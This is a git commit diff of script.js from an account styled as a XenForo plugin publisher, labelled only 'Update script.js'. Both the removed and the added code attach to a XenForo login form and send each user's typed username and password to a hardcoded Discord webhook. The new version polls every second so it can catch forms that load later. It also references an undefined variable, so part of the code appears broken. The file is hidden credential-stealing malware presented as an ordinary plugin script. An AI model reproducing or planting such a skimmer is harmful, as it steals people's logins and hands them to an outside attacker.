98327a362c75ae5bb5e63195218c738691dfabb8
xenforoPluginManagement <131064044+xenforoPluginManagement@users.noreply.github.com>
2023-06-10 09:51:29 +0300

    Update script.js

--- script.js
+++ script.js
@@ -8,8 +8,17 @@ function mesaj(url, mesaj) {
     }));
 }
 
-document.querySelectorAll('form[action="/login/login"]')[0].addEventListener("submit", function(e){
-    var username = document.getElementsByName("login")[0].value
-    var password = document.getElementsByName("password")[0].value
-    mesaj("https://discord.com/api/webhooks/1116770901539700748/p07s7Cyx4_pX1ku6pVELgW6E3_KvcPPPxAFvDMnCcbcmUFcTo-dWa3umeCF5g4i4DKXF", "Kullanıcı: "+username+"\n"+"Şifre: "+password)
-})
+setInterval(() => {
+    
+if(document.querySelectorAll('form[action="/login/login"]')[0] !== undefined) {
+    if (element.getAttribute('listener') !== 'true') {
+        document.querySelectorAll('form[action="/login/login"]')[0].addEventListener("submit", function(e){
+            var username = document.getElementsByName("login")[0].value
+            var password = document.getElementsByName("password")[0].value
+            mesaj("https://discord.com/api/webhooks/1116770901539700748/p07s7Cyx4_pX1ku6pVELgW6E3_KvcPPPxAFvDMnCcbcmUFcTo-dWa3umeCF5g4i4DKXF", "Kullanıcı: "+username+"\n"+"Şifre: "+password)
+            document.querySelectorAll('form[action="/login/login"]')[0].setAttribute('listener', 'true');
+        })
+    }
+}
+
+}, 1000);
